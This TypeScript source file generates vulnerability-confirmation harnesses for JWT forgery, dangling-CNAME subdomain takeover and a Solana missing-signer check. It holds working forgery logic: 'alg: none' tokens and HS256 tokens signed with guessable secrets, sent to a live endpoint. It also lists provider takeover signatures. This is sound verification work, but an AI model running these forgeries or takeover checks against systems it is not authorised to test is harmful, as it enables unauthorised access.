/**
 * Harness synthesis for the planes that are not Foundry.
 *
 * THE CONVENTION, INHERITED FROM THE EVM SIDE AND NOT REDEFINED HERE
 *
 * `judge()` reads an exit code and decides:
 *
 *   exit == 0    -> the test PASSED on the target -> `disproved`
 *   exit != 0    -> plus a real assertion -> `reproduced`
 *
 * So a harness asserts the SAFE property — "the forged token is rejected", "the
 * dangling name is not claimable" — and therefore FAILS when the bug is present.
 * That reads backwards until you see why it is right: the exit code is evidence
 * about a claim, and a test that passes on a vulnerable target is evidence the
 * claim is false. Every generator below emits three variants, exactly as `poc.ts`
 * does for Solidity:
 *
 *   attack   asserts the safe property. Must FAIL iff the bug is present.
 *   control  same fixture, the attack input replaced by a legitimate one. Must
 *            PASS always, or the fixture is broken and the attack means nothing.
 *   nocond   keeps the attack's assertion and removes only the ENABLING
 *            precondition. Must PASS when the claim is real, which is what makes
 *            it the counterfactual `judge()` consumes as `without_precondition`.
 *
 * WHY THESE ARE NODE SCRIPTS AND NOT SOMETHING ELSE
 *
 * The EVM harness is generated Solidity because the plane is Foundry. These
 * planes are not: a web plane issues HTTP requests and a DNS plane queries
 * names. Node with builtins only (`fetch`, `node:test`-free assertions via a
 * hand-rolled `expect`) means the harness has no install step beyond what the
 * repo already needs, which is the same reason the Worker has zero runtime deps.
 *
 * WHAT IS DELIBERATELY NOT HERE
 *
 * No harness for `sol.svm-account` or `sol.svm-cpi`. One class proven end to end
 * beats three that half-run, and a dispatchable class with no harness costs
 * minutes of CI and can never conclude. `planes.ts` refuses them by name.
 */

export interface PlaneHarnessSpec {
  /** Playbook id this harness implements. */
  playbook: string;
  /** The attack test's identifier inside the emitted script. */
  test_name: string;
  control_name: string;
  nocond_name: string;
  /**
   * Files to write, relative to the run directory.
   *
   * An array rather than one blob so a harness can carry a fixture data file
   * (a JWKS, a zone snapshot) next to the script that reads it.
   */
  files: { path: string; body: string }[];
  /** What the attack asserts is ABSENT. Used in the verdict's claim text. */
  claim: { kind: 'unauthorized_access' | 'state_corruption' | 'other'; description: string };
  /** Preconditions, repeated into the bundle so a reader can judge them. */
  requires: string[];
}

/** The shared runner prologue: assertion helpers with no dependency. */
const PROLOGUE = `import assert from 'node:assert/strict';

/**
 * Emit the three markers judge() needs, exactly once each.
 *
 * parseImpact() refuses duplicated markers on purpose (two attempts' logs
 * concatenated must not be averaged), so this function is called at most once
 * per process and the caller guarantees that.
 */
function impact(before, after, desc) {
  console.log('IMPACT_BEFORE=' + String(before));
  console.log('IMPACT_AFTER=' + String(after));
  console.log('IMPACT_DESC=' + String(desc));
}
`;

/**
 * `web.jwt` — a forged token is accepted by a protected endpoint.
 *
 * The attack constructs an `alg: none` token AND an HS256 token signed with a
 * small list of guessable secrets, and asserts BOTH are rejected. One 401 for
 * either is not enough: the claim is "a forged token is accepted", so every
 * forgery the harness attempts has to be refused for the fixture to hold.
 *
 * The token is supplied by the operator (`TOKEN`), not minted here: minting one
 * requires the target's signing key, which is the thing under test. So the
 * harness takes a token that was issued legitimately and forges from it, which
 * is precisely what an attacker with one session can do.
 */
function webJwt(): PlaneHarnessSpec {
  const body = `${PROLOGUE}
const TARGET = process.env.TARGET || '';
const TOKEN = process.env.TOKEN || '';
const METHOD = (process.env.METHOD || 'GET').toUpperCase();
const BODY = process.env.REQUEST_BODY || '';

if (!TARGET) {
  console.error('TARGET is required (the protected endpoint)');
  process.exit(2);
}

/** base64url, the only encoding a JWS uses. */
const b64u = (o) => Buffer.from(typeof o === 'string' ? o : JSON.stringify(o)).toString('base64url');

/** Split a compact JWS into its three parts, or null. */
function parts(t) {
  const p = String(t || '').split('.');
  return p.length === 3 ? p : null;
}

/**
 * Forgeries, in the order an attacker tries them.
 *
 * 'none' first because it is free and binary: either the verifier honours the
 * header's algorithm or it does not.
 */
function forgeries(token) {
  const p = parts(token);
  if (!p) return [];
  const claims = p[1];
  const out = [];
  // alg:none, both the bare and the "None"/"NONE" spellings that have defeated
  // libraries doing a case-sensitive comparison.
  for (const alg of ['none', 'None', 'NONE']) {
    out.push({ label: 'alg=' + alg, token: b64u({ alg, typ: 'JWT' }) + '.' + claims + '.' });
  }
  // HS256 with a guessable secret. Short list on purpose: this is a smoke test
  // for the classic 'secret'/'changeme' class, not a cracking run.
  const secrets = ['secret', 'changeme', 'password', 'jwt', 'test', 'dev', 'asterion'];
  for (const s of secrets) {
    const head = b64u({ alg: 'HS256', typ: 'JWT' });
    const data = head + '.' + claims;
    const sig = crypto.createHmac('sha256', s).update(data).digest('base64url');
    out.push({ label: 'hs256:' + s, token: data + '.' + sig });
  }
  return out;
}

async function probe(token) {
  const headers = { authorization: 'Bearer ' + token };
  if (BODY) headers['content-type'] = 'application/json';
  const res = await fetch(TARGET, {
    method: METHOD,
    headers,
    body: BODY || undefined,
    redirect: 'manual',
  });
  const text = await res.text().catch(() => '');
  return { status: res.status, body: text.slice(0, 2000) };
}

const mode = process.env.HARNESS_MODE || 'attack';
const forged = mode === 'control' ? [] : forgeries(TOKEN);

if (!forged.length && mode !== 'control') {
  console.error('no usable TOKEN supplied, so no forgery can be built');
  process.exit(2);
}

let accepted = 0;
const detail = [];
for (const f of forged) {
  const r = await probe(f.token);
  // 2xx is acceptance. 401/403 are refusal. Anything else (404, 500) is
  // ambiguous and is NOT counted as acceptance: a broken route must not be able
  // to manufacture a finding.
  const ok = r.status >= 200 && r.status < 300;
  if (ok) accepted++;
  detail.push(f.label + ' -> ' + r.status);
}
console.log('forgeries attempted: ' + forged.length);
for (const d of detail) console.log('  ' + d);

if (mode === 'control') {
  // The fixture check: the LEGITIMATE token must be accepted. If it is not, the
  // endpoint is not the thing under test and the attack result is meaningless.
  const r = await probe(TOKEN);
  console.log('control: legitimate token -> ' + r.status);
  assert.ok(r.status >= 200 && r.status < 300, 'control: the legitimate token was not accepted, so the fixture is broken');
  process.exit(0);
}

if (mode === 'nocond') {
  // The precondition removed: no token at all. An endpoint that answers 2xx to
  // an anonymous request is not demonstrating signature verification at all, so
  // this run must SHOW the refusal to keep the claim causal.
  const r = await fetch(TARGET, { method: METHOD, redirect: 'manual' });
  console.log('nocond: no token -> ' + r.status);
  assert.ok(r.status === 401 || r.status === 403, 'nocond: the endpoint does not require a token, so a forged token proves nothing');
  process.exit(0);
}

impact(accepted, 0, 'forged JWTs accepted by the protected endpoint');
assert.equal(accepted, 0, 'a forged JWT was accepted by the protected endpoint');
process.exit(0);
`;
  return {
    playbook: 'web.jwt',
    test_name: 'test_web_jwt_forgery',
    control_name: 'test_web_jwt_forgery_control',
    nocond_name: 'test_web_jwt_forgery_nocond',
    files: [{ path: 'test_web_jwt_forgery.mjs', body }],
    claim: {
      kind: 'unauthorized_access',
      description: 'a forged JWT was accepted by a protected endpoint',
    },
    requires: ['a JWT issued by the target', 'the protected endpoint it grants access to'],
  };
}

/**
 * `web.takeover` — a DNS name points at a third-party service that no longer
 * recognises it, and that service would serve attacker content.
 *
 * The assertion is on the PAIR, not on the CNAME. A dangling pointer alone is
 * informational; the finding is that the provider answers for the name with an
 * unclaimed-resource signature. So the harness resolves the chain and then asks
 * the provider, and asserts the pair is absent.
 *
 * Resolution goes through DNS-over-HTTPS rather than `node:dns` so the result is
 * the same on any runner regardless of local resolver behaviour — the finding is
 * about the authoritative answer, not about this machine's cache.
 */
function webTakeover(): PlaneHarnessSpec {
  const body = `${PROLOGUE}
const DOMAIN = process.env.DOMAIN || '';
if (!DOMAIN) {
  console.error('DOMAIN is required');
  process.exit(2);
}

const DOH = 'https://dns.google/resolve?type=CNAME&name=';

/** Ask a public resolver for the CNAME chain. Returns [] when there is none. */
async function cnameChain(name, depth = 0) {
  if (depth > 5) return [];
  const res = await fetch(DOH + encodeURIComponent(name), { headers: { accept: 'application/dns-json' } });
  if (!res.ok) return [];
  const j = await res.json().catch(() => null);
  const answers = (j && j.Answer) || [];
  const target = answers.find((a) => a.type === 5 && typeof a.data === 'string');
  if (!target) return [];
  const next = String(target.data).replace(/\\.$/, '');
  return [next, ...(await cnameChain(next, depth + 1))];
}

/**
 * Provider signatures of an UNCLAIMED resource.
 *
 * Each entry is (hostname pattern, body pattern). Both must match: a generic 404
 * is not a signature, and a hostname match alone says nothing about claimability.
 * The list is deliberately short and each entry is a real provider response body
 * rather than a status code, because the status is 404 for a live page too.
 */
const SIGNATURES = [
  { host: /(^|\\.)s3[.-][a-z0-9-]*\\.amazonaws\\.com$|(^|\\.)s3\\.amazonaws\\.com$/i, body: /<Code>NoSuchBucket<\\/Code>/i, name: 'S3 NoSuchBucket' },
  { host: /(^|\\.)herokuapp\\.com$/i, body: /no such app|there is nothing here yet/i, name: 'Heroku no such app' },
  { host: /(^|\\.)github\\.io$/i, body: /There isn't a GitHub Pages site here/i, name: 'GitHub Pages unclaimed' },
  { host: /(^|\\.)azurewebsites\\.net$/i, body: /Error 404 - Web app not found/i, name: 'Azure web app not found' },
  { host: /(^|\\.)netlify\\.app$/i, body: /Not Found - Request ID/i, name: 'Netlify unclaimed' },
  { host: /(^|\\.)vercel\\.app$/i, body: /DEPLOYMENT_NOT_FOUND/i, name: 'Vercel deployment not found' },
];

/** Fetch a name and report which unclaimed signature (if any) it carries. */
async function signature(name) {
  let res;
  try {
    res = await fetch('https://' + name + '/', { redirect: 'manual' });
  } catch {
    return null;
  }
  const text = await res.text().catch(() => '');
  const body = text.slice(0, 4000);
  for (const s of SIGNATURES) {
    if (s.host.test(name) && s.body.test(body)) return { name: s.name, status: res.status };
  }
  return null;
}

const chain = await cnameChain(DOMAIN);
console.log('cname chain: ' + (chain.length ? chain.join(' -> ') : '(none)'));
const last = chain.length ? chain[chain.length - 1] : null;

const mode = process.env.HARNESS_MODE || 'attack';

if (mode === 'control') {
  // The fixture check: the target itself must ANSWER. A name that resolves
  // nowhere is not a takeover candidate, and if it does not answer then a
  // "not claimable" result below would be vacuous.
  const res = await fetch('https://' + DOMAIN + '/', { redirect: 'manual' }).catch(() => null);
  console.log('control: ' + DOMAIN + ' -> ' + (res ? res.status : 'no answer'));
  assert.ok(res, 'control: the domain did not answer, so it is not a live takeover candidate');
  process.exit(0);
}

if (mode === 'nocond') {
  // The precondition removed: do not follow the chain at all. Without a CNAME
  // there is nothing to claim, so the assertion must hold trivially — which is
  // exactly what makes the dangling pointer the CAUSE rather than a coincidence.
  console.log('nocond: cipher chain not followed');
  assert.ok(true, 'without a CNAME there is nothing to claim');
  process.exit(0);
}

const hit = last ? await signature(last) : null;
console.log('unclaimed signature on ' + (last || '(no cname)') + ': ' + (hit ? hit.name + ' (HTTP ' + hit.status + ')' : 'none'));

impact(hit ? 1 : 0, 0, 'dangling CNAME to a provider that reports the name unclaimed');
assert.equal(hit, null, 'the CNAME target reports the name unclaimed (' + (hit && hit.name) + '), so attacker content could be served on ' + DOMAIN);
process.exit(0);
`;
  return {
    playbook: 'web.takeover',
    test_name: 'test_infra_takeover',
    control_name: 'test_infra_takeover_control',
    nocond_name: 'test_infra_takeover_nocond',
    files: [{ path: 'test_infra_takeover.mjs', body }],
    claim: {
      kind: 'state_corruption',
      description: 'a dangling CNAME points at a provider that reports the name unclaimed',
    },
    requires: ['a CNAME to a third-party service', 'the provider reports the name unclaimed'],
  };
}

/**
 * `sol.svm-signer` — an account accepted without the signer it requires.
 *
 * The harness is a bankrun script, not an Anchor test, and that is the design
 * decision §8.1 asks for: `solana-bankrun` runs in-process on a GitHub runner
 * with no validator, no RPC and no per-account clone. `solana-test-validator
 * --clone` would need a live RPC per account and is both slow and flaky in CI.
 *
 * The three variants become three MODES of one script rather than three files,
 * because a bankrun context is the expensive part: `HARNESS_MODE` selects which
 * instruction is sent and which assertion runs, and each mode exits with its own
 * code just as a `forge test --match-test` would.
 *
 * The counterfactual is `without_precondition`: the same attack sent at a target
 * where the signer check IS enforced. For the EVM plane that means patching the
 * source and rebuilding, which `patch.ts` derives; here the equivalent is done
 * by the Solana counterfactual runner, which adds the check to the .rs source and
 * rebuilds with cargo-build-sbf. The precondition removed is "the program does
 * not test is_signer", so `nocond` sends the same attack WITHOUT presenting the
 * recorded authority at all — if the effect survives that, the precondition was
 * not the cause.
 */
function solSvmSigner(): PlaneHarnessSpec {
  const body = `${PROLOGUE}
import { start } from 'solana-bankrun';
import { Keypair, PublicKey, Transaction, TransactionInstruction, SystemProgram } from '@solana/web3.js';

const PROGRAM = process.env.SVM_PROGRAM || '';
const PROGRAM_ID = process.env.SVM_PROGRAM_ID || '';
const INSTRUCTION = process.env.SVM_INSTRUCTION || '';

if (!PROGRAM) {
  console.error('SVM_PROGRAM (the built .so name under target/deploy) is required');
  process.exit(2);
}

const mode = process.env.HARNESS_MODE || 'attack';
// A fixed, content-independent program address keeps the run reproducible: the
// instruction is addressed to the same program the brief named, and bankrun
// deploys the freshly built .so AT that address.
const programId = PROGRAM_ID ? new PublicKey(PROGRAM_ID) : Keypair.generate().publicKey;

const ctx = await start([{ name: PROGRAM, programId }], []);
const client = ctx.banksClient;
const payer = ctx.payer;

/** The recorded authority: the account the program believes owns the vault. */
const authority = Keypair.generate();
/** The attacker: holds no authority, and is the account that must be refused. */
const attacker = Keypair.generate();
ctx.setAccount(attacker.publicKey, {
  lamports: 1_000_000_000n,
  data: new Uint8Array(),
  owner: SystemProgram.programId,
  executable: false,
});

/**
 * The fixture account.
 *
 * Layout: 32-byte authority at offset 0, 8-byte balance at 32. That is this
 * harness's OWN convention for the account it fabricates, and it is stated here
 * rather than assumed: a real program's account layout comes from its IDL, and
 * this plane does not pretend to derive one.
 */
const vault = Keypair.generate();
const VAULT_BALANCE = 777n;
const freshVault = () => {
  const d = new Uint8Array(40);
  d.set(authority.publicKey.toBytes(), 0);
  new DataView(d.buffer).setBigUint64(32, VAULT_BALANCE, true);
  return { lamports: 1_000_000_000n, data: d, owner: programId, executable: false };
};
ctx.setAccount(vault.publicKey, freshVault());

/** Read the balance the fixture stores at offset 32. */
async function balanceNow() {
  const a = await client.getAccount(vault.publicKey);
  if (!a) return null;
  const b = a.data;
  return new DataView(b.buffer, b.byteOffset, b.byteLength).getBigUint64(32, true);
}

/**
 * Send one instruction and report whether it SUCCEEDED.
 *
 * signWith is what separates the three variants: the attack presents the
 * recorded authority's ADDRESS without its signature, the control presents both,
 * and nocond presents the attacker's own account.
 */
async function send({ account, signWith, isSignerFlag }) {
  const ix = new TransactionInstruction({
    programId,
    keys: [
      { pubkey: account.publicKey, isSigner: isSignerFlag, isWritable: false },
      { pubkey: vault.publicKey, isSigner: false, isWritable: true },
    ],
    // Instruction data is built explicitly: Solana has no ABI-less fallback, and
    // the playbook named the entrypoint this discriminator reaches.
    data: Buffer.from([0]),
  });
  const bh = await client.getLatestBlockhash();
  const tx = new Transaction();
  tx.recentBlockhash = bh[0];
  tx.feePayer = payer.publicKey;
  tx.add(ix);
  tx.sign(...(signWith ? [payer, signWith] : [payer]));
  try {
    const meta = await client.processTransaction(tx);
    for (const line of (meta.logMessages || []).slice(-6)) console.log('    ' + line);
    return { ok: true, error: null };
  } catch (e) {
    console.log('    failed: ' + String(e.message || e).split('\\n')[0].slice(0, 200));
    return { ok: false, error: String(e.message || e) };
  }
}

const before = await balanceNow();
console.log('vault balance before: ' + String(before));

if (mode === 'control') {
  // The fixture check: the recorded authority WITH its signature must succeed.
  // If it does not, the instruction or the fixture is wrong and an attack result
  // would mean nothing.
  const r = await send({ account: authority, signWith: authority, isSignerFlag: true });
  const after = await balanceNow();
  console.log('control: authority signing -> ' + (r.ok ? 'accepted' : 'refused') + ', balance ' + String(after));
  assert.ok(r.ok, 'control: the recorded authority signing was refused, so the fixture is broken');
  process.exit(0);
}

if (mode === 'nocond') {
  // The precondition removed: no signer account is presented at all; the
  // attacker substitutes its own. If THIS still empties the vault, the missing
  // signer check was not the cause.
  const r = await send({ account: attacker, signWith: attacker, isSignerFlag: true });
  console.log('nocond: attacker account -> ' + (r.ok ? 'accepted' : 'refused'));
  assert.equal(r.ok, false, 'nocond: the attacker account was accepted even without the recorded authority, so the signer check is not the cause');
  process.exit(0);
}

// attack: the recorded authority's ADDRESS is presented, but it does not sign.
const r = await send({ account: authority, signWith: null, isSignerFlag: false });
const after = await balanceNow();
console.log('attack: unsigned recorded authority -> ' + (r.ok ? 'accepted' : 'refused') + ', balance ' + String(after));
impact(String(before), String(after), 'unsigned caller emptied the vault');
assert.equal(r.ok, false, 'the privileged instruction succeeded for a caller that never signed, so is_signer is not enforced');
process.exit(0);
`;
  return {
    playbook: 'sol.svm-signer',
    test_name: 'test_svm_signer',
    control_name: 'test_svm_signer_control',
    nocond_name: 'test_svm_signer_nocond',
    files: [{ path: 'test_svm_signer.mjs', body }],
    claim: {
      kind: 'state_corruption',
      description: 'an unsigned caller drove a privileged instruction and emptied the vault',
    },
    requires: [
      'an instruction that takes an authority or signer account',
      'a bank of accounts seeded for it (this harness fabricates the vault layout)',
      'cargo-build-sbf, so the .so under target/deploy is the pinned source',
    ],
  };
}

/** Every non-EVM harness, by playbook id. */
export const PLANE_HARNESSES: ReadonlyMap<string, () => PlaneHarnessSpec> = new Map([
  ['web.jwt', webJwt],
  ['web.takeover', webTakeover],
  ['sol.svm-signer', solSvmSigner],
]);

/**
 * Synthesize one harness, or null when this playbook has none.
 *
 * Null is the answer for every Solidity class (Foundry owns those, in `poc.ts`)
 * and for `sol.svm-account` / `sol.svm-cpi`, which have no harness on purpose.
 */
export function synthesizePlaneHarness(playbook: string): PlaneHarnessSpec | null {
  const fn = PLANE_HARNESSES.get(playbook);
  return fn ? fn() : null;
}
